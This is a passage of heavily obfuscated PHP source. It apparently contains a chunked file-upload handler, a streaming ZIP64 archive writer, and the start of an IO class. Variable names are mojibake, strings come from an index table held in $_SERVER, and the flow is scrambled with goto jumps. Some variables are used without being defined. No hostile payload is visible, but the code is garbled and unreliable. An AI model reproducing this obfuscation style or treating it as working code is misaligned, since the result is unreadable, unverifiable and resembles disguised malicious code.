intval($this->in[$bòÎé‡§¯‰[1946]]) : 1; goto C¿½»ëƒÜ; bê·ĞŸòø: CacheLock::lock($this->tempFile, 20); $EÒğÈªµìÎ = $this->statusGet(); $this->initFileTemp(); goto BŠä¼İ™¾Í; D•Ä¯«¿Ø¥: @unlink($b´Ù•…é); if (!$böÚğÛŞÁ—) { $this->showJson($bòÎé‡§¯‰[1953] . $F…¤¿õò·, !1); } $EÒğÈªµìÎ[$bòÎé‡§¯‰[1954]] = $f‹¦“å›Ç¤; goto Eà†Şéà“ì; dÏïÏğìó: $böÚğÛŞÁ— = $this->writeTo($b´Ù•…é, $C•è»¯”è, $this->tempFile); $dÉ“É¨Šõ˜ = IO::hashSimple($b´Ù•…é); $fíŞìƒñ×ô = IO::size($b´Ù•…é); goto D•Ä¯«¿Ø¥; C¿½»ëƒÜ: $F¦„î­ƒ‘Á = $this->tempFile . $bòÎé‡§¯‰[1947] . $F…¤¿õò·; $fíŞìƒñ×ô = isset($this->in[$bòÎé‡§¯‰[516]]) ? intval($this->in[$bòÎé‡§¯‰[516]]) : 0; $B°±ôˆ¶ŒÖ = isset($this->in[$bòÎé‡§¯‰[1948]]) ? intval($this->in[$bòÎé‡§¯‰[1948]]) : 0; goto a¢¡Öìˆˆ¡; Eà†Şéà“ì: $EÒğÈªµìÎ[$bòÎé‡§¯‰[1955]][$bòÎé‡§¯‰[1956] . $F…¤¿õò·] = array($bòÎé‡§¯‰[1957] => $BÌÒÓ¤à»À, $bòÎé‡§¯‰[1030] => $F…¤¿õò·, $bòÎé‡§¯‰[77] => $fíŞìƒñ×ô, $bòÎé‡§¯‰[160] => $dÉ“É¨Šõ˜); $this->statusSet($EÒğÈªµìÎ); if (count($EÒğÈªµìÎ[$bòÎé‡§¯‰[1955]]) != $EÒğÈªµìÎ[$bòÎé‡§¯‰[1954]]) { $this->showJson($bòÎé‡§¯‰[1958] . $F…¤¿õò·, !0); } goto c¨ÍÑ…Ù½Ø; c¨ÍÑ…Ù½Ø: ignore_timeout(); if (!$this->checkChunkHash($EÒğÈªµìÎ)) { $this->showJson($bòÎé‡§¯‰[1959], !1); } $this->statusSet(!1); goto A›²îè•”²; a¢¡Öìˆˆ¡: if ($f‹¦“å›Ç¤ > 1 && $B°±ôˆ¶ŒÖ <= 0) { show_json($bòÎé‡§¯‰[1949], !1); } if ($B°±ôˆ¶ŒÖ > $fíŞìƒñ×ô) { $f‹¦“å›Ç¤ = 1; } if ($f‹¦“å›Ç¤ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto bê·ĞŸòø; BŠä¼İ™¾Í: $b´Ù•…é = $this->moveUploadedFile($F¦„î­ƒ‘Á); if ($fíŞìƒñ×ô > 0 && filesize($b´Ù•…é) == 0) { $this->showJson($bòÎé‡§¯‰[1950], !1); } if (!$b´Ù•…é) { $this->showJson(LNG($bòÎé‡§¯‰[1951]), !1); } goto fà¯æ¾î¶; cØğŠ„œâç: } private function checkSize() { $B æíÎÓñò =& $_SERVER[Ö¹ñÒÁ²÷]; if (phpBuild64() || $this->in[$B æíÎÓñò[77]] < PHP_INT_MAX) { return; } show_json(LNG($B æíÎÓñò[1960]), !1); } private function showJson($DÀÍ§‚®½, $Bé¯¡„¬¯ù) { CacheLock::unlock($this->tempFile); if (!$Bé¯¡„¬¯ù) { return show_json($DÀÍ§‚®½, $Bé¯¡„¬¯ù); } show_json($DÀÍ§‚®½, $Bé¯¡„¬¯ù); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto ağ¦¹É‡÷¬; ağ¦¹É‡÷¬: $d„Íºƒù‘ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¦Åê²ğ¬ = TEMP_FILES; @mk_dir($D¦Åê²ğ¬); goto c…¬²¨ÓÎ¨; aÑµÒ´»‰: $this->tempFile = $D¦Åê²ğ¬ . $d„Íºƒù‘[1963] . md5($f©øÃ”ĞİØ . $this->in[$d„Íºƒù‘[1507]]); goto eêÈ½Á…ÊÙ; c…¬²¨ÓÎ¨: touch($D¦Åê²ğ¬ . $d„Íºƒù‘[1961]); $f©øÃ”ĞİØ = isset($this->in[$d„Íºƒù‘[1962]]) ? $this->in[$d„Íºƒù‘[1962]] : !1; if (strlen($f©øÃ”ĞİØ) < 30) { $f©øÃ”ĞİØ = md5(USER_ID . $this->in[$d„Íºƒù‘[75]] . $this->fileName . $this->in[$d„Íºƒù‘[77]]); } goto aÑµÒ´»‰; eêÈ½Á…ÊÙ: } private function moveUploadedFile($DâŸ‰öÖˆö) { $f¡Ú¼ãŸ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; $d·Å®ŒÓÚá = $this->uploadFile; if ($d·Å®ŒÓÚá == $f¡Ú¼ãŸ‚[1964]) { @file_put_contents($DâŸ‰öÖˆö, base64_decode($_REQUEST[$f¡Ú¼ãŸ‚[1965]])); } else { if ($d·Å®ŒÓÚá == $f¡Ú¼ãŸ‚[1789]) { $e›òòÁ†éÕ = @fopen($DâŸ‰öÖˆö, $f¡Ú¼ãŸ‚[1497]); $this->writeTo($d·Å®ŒÓÚá, $e›òòÁ†éÕ, $DâŸ‰öÖˆö); } else { if (!move_uploaded_file($d·Å®ŒÓÚá, $DâŸ‰öÖˆö)) { return !1; } } } return $DâŸ‰öÖˆö; } private function writeTo($e ”×£†Şİ, $dùìĞƒêË, $eôŠ¸³ã’ñ) { goto FÎ©»ã†µ; eÀ…•‰ïíª: return !0; goto a¼Ü‘˜•§; FÎ©»ã†µ: $BŞóÜ’—“ =& $_SERVER[Ö¹ñÒÁ²÷]; $b¿«¸¤Çù“ = $BŞóÜ’—“[1966] . $eôŠ¸³ã’ñ; $cœ² Ü” = CacheLock::lock($b¿«¸¤Çù“, 1); goto Bí­œùÛ™; B¸˜´‡…¥Ç: fclose($A¸áç•ªèÜ); fclose($dùìĞƒêË); CacheLock::unlock($b¿«¸¤Çù“); goto eÀ…•‰ïíª; Bí­œùÛ™: $A¸áç•ªèÜ = @fopen($e ”×£†Şİ, $BŞóÜ’—“[1496]); if (!$A¸áç•ªèÜ || !$dùìĞƒêË || !$cœ² Ü”) { CacheLock::unlock($b¿«¸¤Çù“); return !1; } while (!feof($A¸áç•ªèÜ)) { fwrite($dùìĞƒêË, fread($A¸áç•ªèÜ, 1024 * 200)); } goto B¸˜´‡…¥Ç; a¼Ü‘˜•§: } private function statusGet() { goto AŠéäƒâˆ; AŠéäƒâˆ: $E±²ÄÅ©–£ =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($this->statusData)) { return $this->statusData; } $FĞç¦Ïù = $this->tempFile . $E±²ÄÅ©–£[1967]; goto E¥ë¯§Äší; FªäŠ…ìÍ­: if (!$this->statusData) { $dÅ¿²Ã¦Ä = array($E±²ÄÅ©–£[28] => $this->fileName, $E±²ÄÅ©–£[1954] => 0, $E±²ÄÅ©–£[1955] => array()); $this->statusSet($dÅ¿²Ã¦Ä); } return $this->statusData; goto aÌöŸ±àäñ; E¥ë¯§Äší: $eƒ˜÷¼Ç×à = !1; if (file_exists($FĞç¦Ïù)) { $eƒ˜÷¼Ç×à = @file_get_contents($FĞç¦Ïù); } if ($eƒ˜÷¼Ç×à) { $this->statusData = json_decode($eƒ˜÷¼Ç×à, !0); } goto FªäŠ…ìÍ­; aÌöŸ±àäñ: } public function statusSet($FÍØ¥‚óŠ¶) { $cõëŞ´¼à˜ = $this->tempFile . $_SERVER[Ö¹ñÒÁ²÷][1967]; if (!$FÍØ¥‚óŠ¶) { if (file_exists($cõëŞ´¼à˜)) { @unlink($cõëŞ´¼à˜); } return !0; } $this->statusData = $FÍØ¥‚óŠ¶; return file_put_contents($cõëŞ´¼à˜, json_encode($FÍØ¥‚óŠ¶)); } private function initFileTemp() { $C†„ŒªóÀå =& $_SERVER[Ö¹ñÒÁ²÷]; if (file_exists($this->tempFile)) { return; } $cŠÜ±Ğ’‡É = fopen($this->tempFile, $C†„ŒªóÀå[1968]); fseek($cŠÜ±Ğ’‡É, $this->in[$C†„ŒªóÀå[77]] - 1, SEEK_SET); fwrite($cŠÜ±Ğ’‡É, $C†„ŒªóÀå[464]); fclose($cŠÜ±Ğ’‡É); } public function checkChunk() { goto aÌ…ôÖèœ; B­¶½ÇÌÇí: return $dËÔã“·ºî; goto aÇõŠÎá”; aÌ…ôÖèœ: $bÅˆé‰Ì´Í =& $_SERVER[Ö¹ñÒÁ²÷]; $dËÔã“·ºî = array(); CacheLock::lock($this->tempFile); goto f‘ğ¦–ÔÇÆ; f‘ğ¦–ÔÇÆ: $CªÉç¹ÆÕ÷ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($CªÉç¹ÆÕ÷[$bÅˆé‰Ì´Í[1955]] as $dîÜîÔ‹²) { $D’Ø¨õôŠƒ = $dîÜîÔ‹²[$bÅˆé‰Ì´Í[160]]; if ($D’Ø¨õôŠƒ) { $dËÔã“·ºî[$bÅˆé‰Ì´Í[1969] . $dîÜîÔ‹²[$bÅˆé‰Ì´Í[1030]]] = $D’Ø¨õôŠƒ; } } goto B­¶½ÇÌÇí; aÇõŠÎá”: } private function checkChunkHash($a…Œ©½‹Ç¨) { goto Cèˆ‘êÌ«“; Cèˆ‘êÌ«“: $a—ÌÜÕö° =& $_SERVER[Ö¹ñÒÁ²÷]; if (count($a…Œ©½‹Ç¨[$a—ÌÜÕö°[1955]]) != $a…Œ©½‹Ç¨[$a—ÌÜÕö°[1954]]) { return !1; } $Fêºš®¨” = _get($this->in, $a—ÌÜÕö°[1962]); goto Ašå÷ä™ƒ±; b¡ö‰ÛÒ¿æ: $bÒ¸‚Ó‘ = !0; foreach ($a…Œ©½‹Ç¨[$a—ÌÜÕö°[1955]] as $a§ñáÔÔ…à) { fseek($dŠ¯Ôƒ´¯, $a§ñáÔÔ…à[$a—ÌÜÕö°[1957]]); $FõØÓÅ÷‘ = PathDriverStream::hash($dŠ¯Ôƒ´¯, $a§ñáÔÔ…à[$a—ÌÜÕö°[77]]); if ($a§ñáÔÔ…à[$a—ÌÜÕö°[160]] != $FõØÓÅ÷‘) { $bÒ¸‚Ó‘ = !1; break; } } fclose($dŠ¯Ôƒ´¯); goto c”´Ç‹À­; c”´Ç‹À­: return $bÒ¸‚Ó‘; goto fõ§¼„Œ¥‡; Ašå÷ä™ƒ±: $Dƒ¶×ÎÖ³ç = _get($this->in, $a—ÌÜÕö°[1970]); if (strlen($Dƒ¶×ÎÖ³ç) == 32 && IO::hashSimple($this->tempFile) == $Fêºš®¨” && IO::hashMd5($this->tempFile) == $Dƒ¶×ÎÖ³ç) { return !0; } $dŠ¯Ôƒ´¯ = fopen($this->tempFile, $a—ÌÜÕö°[1156]); goto b¡ö‰ÛÒ¿æ; fõ§¼„Œ¥‡: } public static function fileName() { goto DÄ³ìÓ¼Æ; DÄ³ìÓ¼Æ: $c‰Ï½¶Îš =& $_SERVER[Ö¹ñÒÁ²÷]; global $in; $dÓ–ÁÜ­† = isset($in[$c‰Ï½¶Îš[28]]) ? $in[$c‰Ï½¶Îš[28]] : $c‰Ï½¶Îš[33]; goto B²¥´…àº; föŞÏÉ•’°: if ($d±ÌÅÀØ®Ë == $c‰Ï½¶Îš[1972] || $d±ÌÅÀØ®Ë == $c‰Ï½¶Îš[1973]) { $dÓ–ÁÜ­† = date($c‰Ï½¶Îš[687], $F‹­ï‚ÙÛœ) . $c‰Ï½¶Îš[70] . $in[$c‰Ï½¶Îš[77]] . $c‰Ï½¶Îš[1604]; } else { if ($d±ÌÅÀØ®Ë == $c‰Ï½¶Îš[1974]) { $dÓ–ÁÜ­† = date($c‰Ï½¶Îš[687], $F‹­ï‚ÙÛœ) . $c‰Ï½¶Îš[70] . $in[$c‰Ï½¶Îš[77]] . $c‰Ï½¶Îš[1975]; } } return $dÓ–ÁÜ­†; goto cà±«†ù; B²¥´…àº: if (!empty($_FILES)) { $dÓ–ÁÜ­† = $dÓ–ÁÜ­† ? $dÓ–ÁÜ­† : $_FILES[$c‰Ï½¶Îš[163]][$c‰Ï½¶Îš[382]]; } $dÓ–ÁÜ­† = str_replace(array($c‰Ï½¶Îš[93], $c‰Ï½¶Îš[8]), array($c‰Ï½¶Îš[8], $c‰Ï½¶Îš[91]), trim($dÓ–ÁÜ­†)); if (!is_wap()) { return $dÓ–ÁÜ­†; } goto c¼Ş»„˜²; c¼Ş»„˜²: $F‹­ï‚ÙÛœ = strtotime($in[$c‰Ï½¶Îš[1971]]); $F‹­ï‚ÙÛœ = $F‹­ï‚ÙÛœ ? $F‹­ï‚ÙÛœ : time(); $d±ÌÅÀØ®Ë = strtolower($dÓ–ÁÜ­†); goto föŞÏÉ•’°; cà±«†ù: } private function errorInfo($EÆè²„³ Ø) { $AñÛÉÕØƒ† =& $_SERVER[Ö¹ñÒÁ²÷]; $B÷Şºğõºè = array($AñÛÉÕØƒ†[1976], $AñÛÉÕØƒ†[1977], $AñÛÉÕØƒ†[1978], $AñÛÉÕØƒ†[1979], $AñÛÉÕØƒ†[1980], $AñÛÉÕØƒ†[1981], $AñÛÉÕØƒ†[1982], $AñÛÉÕØƒ†[1983]); return $EÆè²„³ Ø . $AñÛÉÕØƒ†[4] . $B÷Şºğõºè[$EÆè²„³ Ø]; } } class ZipMake { const VERSION = "\60\56\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($F£™¾âÊï½ = null) { $Eš§§ ¥œ† =& $_SERVER[Ö¹ñÒÁ²÷]; $this->outputStream = fopen($Eš§§ ¥œ†[1984], $Eš§§ ¥œ†[1212]); $this->outputName = $F£™¾âÊï½; $this->needHeaders = !0; } public function addFile($D–½„®¼àŸ, $f©É¢ÓÅ†Ê) { goto A¦´ßñÇƒ; dá É­¶½È: $bÀ”ĞÒ¼ƒŠ = $this->addFileHeader($D–½„®¼àŸ, $d—ÇÊóõ§Ñ); $bšŠ‘ƒÌ®ö = $BÏ‹ÀĞ…¬Ü = filesize($f©É¢ÓÅ†Ê); $Eå¬‘ê†Ä = fopen($f©É¢ÓÅ†Ê, $dË¼È¶Â[1985]); goto F•½ğÙ¬¨è; F•½ğÙ¬¨è: while (!feof($Eå¬‘ê†Ä)) { $c‰‚„Äï«´ = fread($Eå¬‘ê†Ä, 1048576); $this->send($c‰‚„Äï«´); } fclose($Eå¬‘ê†Ä); $b„µ‰ùŸÃ = hexdec(hash_file($dË¼È¶Â[1986], $f©É¢ÓÅ†Ê)); goto d¯…¶È¬‹À; A¦´ßñÇƒ: $dË¼È¶Â =& $_SERVER[Ö¹ñÒÁ²÷]; $D–½„®¼àŸ = $this->filterFilename($D–½„®¼àŸ); $d—ÇÊóõ§Ñ = static::METHOD_STORE; goto dá É­¶½È; d¯…¶È¬‹À: $this->addFileFooter($D–½„®¼àŸ, $d—ÇÊóõ§Ñ, $b„µ‰ùŸÃ, $bšŠ‘ƒÌ®ö, $BÏ‹ÀĞ…¬Ü, $bÀ”ĞÒ¼ƒŠ); goto EÁ…÷°Œ¯; EÁ…÷°Œ¯: } public function addFileFromStream($EŒèğªÏ÷±, $c‹Ï›Û¡Â) { goto cË×Š¬¦í; D­±•¾ÓÃÓ: $Cº®˜ÚÏù = hash_init($_SERVER[Ö¹ñÒÁ²÷][1986]); while (!feof($c‹Ï›Û¡Â)) { $DÄª¯‰®Ì– = fread($c‹Ï›Û¡Â, 1048576); hash_update($Cº®˜ÚÏù, $DÄª¯‰®Ì–); $this->send($DÄª¯‰®Ì–); } $fª†¸¾‚÷ = hexdec(hash_final($Cº®˜ÚÏù)); goto aË²¶Ó™­é; cË×Š¬¦í: $EŒèğªÏ÷± = $this->filterFilename($EŒèğªÏ÷±); $F‚ËÏíÔ¢• = static::METHOD_STORE; $Fë‡İ…èëÂ = $this->addFileHeader($EŒèğªÏ÷±, $F‚ËÏíÔ¢•); goto e‹Ë“èÎ‹Œ; aË²¶Ó™­é: $this->addFileFooter($EŒèğªÏ÷±, $F‚ËÏíÔ¢•, $fª†¸¾‚÷, $bŠ’“ÕâÄ, $B«„ÆÚ±¤Ü, $Fë‡İ…èëÂ); goto A´—ŠÌ‡éõ; e‹Ë“èÎ‹Œ: fseek($c‹Ï›Û¡Â, 0, SEEK_END); $bŠ’“ÕâÄ = $B«„ÆÚ±¤Ü = ftell($c‹Ï›Û¡Â); rewind($c‹Ï›Û¡Â); goto D­±•¾ÓÃÓ; A´—ŠÌ‡éõ: } public function finish() { foreach ($this->files as $eù‘æóÓØ) { $this->addCdrFile($eù‘æóÓØ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($D¶ÌÜÃŒêÌ, $FŸ¸°Àé ) { goto eÁ‘•ãò°ß; E¸¹…°©äù: return strlen($eº¼ÀœôÒà) + $BÊ”—ºß÷æ + strlen($CĞÑå­õÄ); goto c‹ôÔ–ñô»; eÁ‘•ãò°ß: $f¾Â´Ãˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¶ÌÜÃŒêÌ = preg_replace($f¾Â´Ãˆ[1987], $f¾Â´Ãˆ[33], $D¶ÌÜÃŒêÌ); $BÊ”—ºß÷æ = strlen($D¶ÌÜÃŒêÌ); goto a×´á‡Ø°¢; a×´á‡Ø°¢: $aÂ•È™·ó· = $this->dosTime(time()); $bÊ°Š†î’² = array(array($f¾Â´Ãˆ[1988], static::FILE_HEADER_SIGNATURE), array($f¾Â´Ãˆ[1989], static::ZIP_VERSION_64), array($f¾Â´Ãˆ[1989], 8), array($f¾Â´Ãˆ[1989], $FŸ¸°Àé ), array($f¾Â´Ãˆ[1988], $aÂ•È™·ó·), array($f¾Â´Ãˆ[1988], 0), array($f¾Â´Ãˆ[1988], 4294967295), array($f¾Â´Ãˆ[1988], 4294967295), array($f¾Â´Ãˆ[1989], $BÊ”—ºß÷æ), array($f¾Â´Ãˆ[1989], 32)); $cá–Ù˜¸® = array(array($f¾Â´Ãˆ[1989], 1), array($f¾Â´Ãˆ[1989], 28), array($f¾Â´Ãˆ[1990], 0), array($f¾Â´Ãˆ[1990], 0), array($f¾Â´Ãˆ[1990], 0), array($f¾Â´Ãˆ[1988], 0)); goto a¯’‘Ğš†–; a¯’‘Ğš†–: $eº¼ÀœôÒà = $this->packFields($bÊ°Š†î’²); $CĞÑå­õÄ = $this->packFields($cá–Ù˜¸®); $this->send($eº¼ÀœôÒà . $D¶ÌÜÃŒêÌ . $CĞÑå­õÄ); goto E¸¹…°©äù; c‹ôÔ–ñô»: } protected function addFileFooter($aİ¬¶†ÏÀÙ, $fÄÓ†·ÆÀ‘, $D‚…áÆ»¼ã, $f¥œâ—˜ˆÉ, $fÜ³´¬¥µÁ, $CÔ‡×ƒŒµš) { $c‚åŒ†ÇÓŒ =& $_SERVER[Ö¹ñÒÁ²÷]; $A§©ŒÃÚĞ = array(array($c‚åŒ†ÇÓŒ[1988], static::DATA_DESCRIPTOR_SIGNATURE), array($c‚åŒ†ÇÓŒ[1988], $D‚…áÆ»¼ã), array($c‚åŒ†ÇÓŒ[1990], $f¥œâ—˜ˆÉ), array($c‚åŒ†ÇÓŒ[1990], $fÜ³´¬¥µÁ)); $fÍˆ…çğ» = $this->packFields($A§©ŒÃÚĞ); $this->send($fÍˆ…çğ»); $fİ„åó¬Ä = $CÔ‡×ƒŒµš + $f¥œâ—˜ˆÉ + $bÁ’Ñ©; $this->addToCdr($aİ¬¶†ÏÀÙ, $fÄÓ†·ÆÀ‘, $D‚…áÆ»¼ã, $f¥œâ—˜ˆÉ, $fÜ³´¬¥µÁ, $fİ„åó¬Ä); } private function addToCdr($AóøåÛ‚âÅ, $BãŒáŒó„ñ, $c×Ú³‚´œÌ, $FˆïìîàŠ½, $fÒÏŠìªÚ, $E””ò”Îˆš) { $this->files[] = array($AóøåÛ‚âÅ, $BãŒáŒó„ñ, $c×Ú³‚´œÌ, $FˆïìîàŠ½, $fÒÏŠìªÚ, $this->ofs); $this->ofs += $E””ò”Îˆš; } protected function addCdrFile($B’Ë¼òĞâŠ) { goto Aó¶ˆ Ñ—à; d¹ĞˆÍŠ³: $aÖ£â´—‘ = $this->packFields($a”ß™½å ); $bí“‰¦Ÿ§¬ = $this->packFields($fù‡ß˜æè); $FôØ‰µ°Ş = $aÖ£â´—‘ . $eÒšƒŠõŸ­ . $b¨ßëÄåî¨ . $bí“‰¦Ÿ§¬; goto f¾›¨ÚåÂÚ; aİâ£×Õùº: $BºÓŞøµ¬ƒ = $this->dosTime(time()); $a”ß™½å  = array(array($aŞ·Æ®ñõ[1988], static::CDR_FILE_SIGNATURE), array($aŞ·Æ®ñõ[1989], static::ZIP_VERSION_64), array($aŞ·Æ®ñõ[1989], static::ZIP_VERSION_64), array($aŞ·Æ®ñõ[1989], 8), array($aŞ·Æ®ñõ[1989], $b‡ßÈİ·´ö), array($aŞ·Æ®ñõ[1988], $BºÓŞøµ¬ƒ), array($aŞ·Æ®ñõ[1988], $Dì¸¼ÌöŸõ), array($aŞ·Æ®ñõ[1988], 4294967295), array($aŞ·Æ®ñõ[1988], 4294967295), array($aŞ·Æ®ñõ[1989], strlen($eÒšƒŠõŸ­)), array($aŞ·Æ®ñõ[1989], 32), array($aŞ·Æ®ñõ[1989], strlen($b¨ßëÄåî¨)), array($aŞ·Æ®ñõ[1989], 0), array($aŞ·Æ®ñõ[1989], 0), array($aŞ·Æ®ñõ[1988], 32), array($aŞ·Æ®ñõ[1988], 4294967295)); $fù‡ß˜æè = array(array($aŞ·Æ®ñõ[1989], 1), array($aŞ·Æ®ñõ[1989], 28), array($aŞ·Æ®ñõ[1990], $DÜ«ÊäÄ§Ú), array($aŞ·Æ®ñõ[1990], $c°Îãâ¸Ô), array($aŞ·Æ®ñõ[1990], $B‡ÈÒƒ), array($aŞ·Æ®ñõ[1988], 0)); goto d¹ĞˆÍŠ³; f¾›¨ÚåÂÚ: $this->send($FôØ‰µ°Ş); $this->cdr_ofs += strlen($FôØ‰µ°Ş); goto AÒš²’æä; Aó¶ˆ Ñ—à: $aŞ·Æ®ñõ =& $_SERVER[Ö¹ñÒÁ²÷]; list($eÒšƒŠõŸ­, $b‡ßÈİ·´ö, $Dì¸¼ÌöŸõ, $c°Îãâ¸Ô, $DÜ«ÊäÄ§Ú, $B‡ÈÒƒ) = $B’Ë¼òĞâŠ; $b¨ßëÄåî¨ = $aŞ·Æ®ñõ[33]; goto aİâ£×Õùº; AÒš²’æä: } protected function addCdr64Eof() { goto bƒî›ÎÁÂ«; bƒî›ÎÁÂ«: $e“²„¾ =& $_SERVER[Ö¹ñÒÁ²÷]; $f¢¯ºÍ‘…Ç = count($this->files); $eøÏŒÏ‹Ü = $this->cdr_ofs; goto fÜÃ¡¥“§•; AÍ·ˆˆ­–Ç: $this->send($F…½½¢ÄØÃ); goto A¸Ó˜§§ö; fÜÃ¡¥“§•: $eù×Š—‡ = $this->ofs; $bÛ—‰³Ş‡™ = array(array($e“²„¾[1988], static::ZIP64_CDR_EOF_SIGNATURE), array($e“²„¾[1990], 44), array($e“²„¾[1989], static::ZIP_VERSION_64), array($e“²„¾[1989], static::ZIP_VERSION_64), array($e“²„¾[1988], 0), array($e“²„¾[1988], 0), array($e“²„¾[1990], $f¢¯ºÍ‘…Ç), array($e“²„¾[1990], $f¢¯ºÍ‘…Ç), array($e“²„¾[1990], $eøÏŒÏ‹Ü), array($e“²„¾[1990], $eù×Š—‡)); $F…½½¢ÄØÃ = $this->packFields($bÛ—‰³Ş‡™); goto AÍ·ˆˆ­–Ç; A¸Ó˜§§ö: } protected function addCdr64Locator() { goto c™í£±è‰Ì; c™í£±è‰Ì: $E…Û‘š‡‹… =& $_SERVER[Ö¹ñÒÁ²÷]; $B®ˆ†¤ó±Ç = count($this->files); $Eø·‡„¦é­ = $this->cdr_ofs; goto b¸Ê°„å­; dÔ×ĞóĞŞà: $this->send($F–¤Ç³‹”Ù); goto AòöİßÄ³®; b¸Ê°„å­: $aÁ±˜ŞôÅê = $this->ofs; $fñçÔ‚Ë»ê = array(array($E…Û‘š‡‹…[1988], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($E…Û‘š‡‹…[1988], 0), array($E…Û‘š‡‹…[1990], $aÁ±˜ŞôÅê + $Eø·‡„¦é­), array($E…Û‘š‡‹…[1988], 1)); $F–¤Ç³‹”Ù = $this->packFields($fñçÔ‚Ë»ê); goto dÔ×ĞóĞŞà; AòöİßÄ³®: } protected function addCdrEof() { goto c®Å“¾´•¤; D«‡åÊâ®¤: $c÷›ôğªØê = $this->ofs; $d©½¡—ß³ = $Cõõé·Î³[33]; $bóÂ“˜ˆ¼Ã = array(array($Cõõé·Î³[1988], static::CDR_EOF_SIGNATURE), array($Cõõé·Î³[1989], 0), array($Cõõé·Î³[1989], 0), array($Cõõé·Î³[1989], $c˜¹÷ĞÂ«å), array($Cõõé·Î³[1989], $c˜¹÷ĞÂ«å), array($Cõõé·Î³[1988], 4294967295), array($Cõõé·Î³[1988], 4294967295), array($Cõõé·Î³[1989], strlen($d©½¡—ß³))); goto fÛ–•İêé; fÛ–•İêé: $FŒéÀÚÔäÜ = $this->packFields($bóÂ“˜ˆ¼Ã) . $d©½¡—ß³; $this->send($FŒéÀÚÔäÜ); goto Fµá•öôæ¨; c®Å“¾´•¤: $Cõõé·Î³ =& $_SERVER[Ö¹ñÒÁ²÷]; $c˜¹÷ĞÂ«å = count($this->files); $cÒ”ã´İÈ = $this->cdr_ofs; goto D«‡åÊâ®¤; Fµá•öôæ¨: } protected function addCdr() { foreach ($this->files as $c …±‡ªÒª) { $this->addCdrFile($c …±‡ªÒª); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $bø°¥´£î =& $_SERVER[Ö¹ñÒÁ²÷]; $bİ·İÉÒù¨ = $bø°¥´£î[198]; if ($this->outputName) { $Aæ”¥¾èç = trim(str_replace(array($bø°¥´£î[112], $bø°¥´£î[55], $bø°¥´£î[93], $bø°¥´£î[67], $bø°¥´£î[213], $bø°¥´£î[986]), $bø°¥´£î[33], $this->outputName)); $E¨öµÚ‹÷® = rawurlencode($Aæ”¥¾èç); $bİ·İÉÒù¨ .= "\73\x20\x66\151\x6c\x65\x6e\141\x6d\145\52\x3d\165\164\146\x2d\x38\47\x27{$E¨öµÚ‹÷®}"; } $a¶îùĞÅø = array($bø°¥´£î[195] => $bø°¥´£î[1991], $bø°¥´£î[1992] => $bİ·İÉÒù¨, $bø°¥´£î[1993] => $bø°¥´£î[1994], $bø°¥´£î[1995] => $bø°¥´£î[1996], $bø°¥´£î[1997] => $bø°¥´£î[1998]); foreach ($a¶îùĞÅø as $D¦ÍÊï¢ => $E„İ©ö­¡•) { header($D¦ÍÊï¢ . $bø°¥´£î[876] . $E„İ©ö­¡•); } } protected function send($a©Èùšƒ›Ä) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $a©Èùšƒ›Ä); } protected final function dosTime($B×ÏèĞÙÍÓ) { $BîÔÕä…ë =& $_SERVER[Ö¹ñÒÁ²÷]; $CÂÛ‘Éİİ‘ = getdate($B×ÏèĞÙÍÓ); if ($CÂÛ‘Éİİ‘[$BîÔÕä…ë[1701]] < 1980) { $CÂÛ‘Éİİ‘ = array($BîÔÕä…ë[1701] => 1980, $BîÔÕä…ë[1999] => 1, $BîÔÕä…ë[2000] => 1, $BîÔÕä…ë[2001] => 0, $BîÔÕä…ë[2002] => 0, $BîÔÕä…ë[2003] => 0); } $CÂÛ‘Éİİ‘[$BîÔÕä…ë[1701]] -= 1980; return $CÂÛ‘Éİİ‘[$BîÔÕä…ë[1701]] << 25 | $CÂÛ‘Éİİ‘[$BîÔÕä…ë[1999]] << 21 | $CÂÛ‘Éİİ‘[$BîÔÕä…ë[2000]] << 16 | $CÂÛ‘Éİİ‘[$BîÔÕä…ë[2001]] << 11 | $CÂÛ‘Éİİ‘[$BîÔÕä…ë[2002]] << 5 | $CÂÛ‘Éİİ‘[$BîÔÕä…ë[2003]] >> 1; } protected function packFields($cÅ£ÇÌÚ®¿) { $cöñ®„½ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¬Û·ôØ›¹ = $cöñ®„½[33]; $d‡îŒ±’„ = array(); foreach ($cÅ£ÇÌÚ®¿ as $Dò’¹î´¤Ô) { $D¬Û·ôØ›¹ .= $Dò’¹î´¤Ô[0]; $d‡îŒ±’„[] = $Dò’¹î´¤Ô[1]; } array_unshift($d‡îŒ±’„, $D¬Û·ôØ›¹); return call_user_func_array($cöñ®„½[2004], $d‡îŒ±’„); } protected function filterFilename($A‚è¤±®è˜) { $EîÑİîéËª =& $_SERVER[Ö¹ñÒÁ²÷]; return str_replace(array($EîÑİîéËª[93], $EîÑİîéËª[4], $EîÑİîéËª[172], $EîÑİîéËª[69], $EîÑİîéËª[112], $EîÑİîéËª[921], $EîÑİîéËª[924], $EîÑİîéËª[267]), $EîÑİîéËª[70], $A‚è¤±®è˜); } } goto E˜ ĞÌøÄŸ; F‘³õÍÜî¸: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($DãÎáÒŞí, $E÷ã£÷š) { $d¶´°ÙäÉƒ = 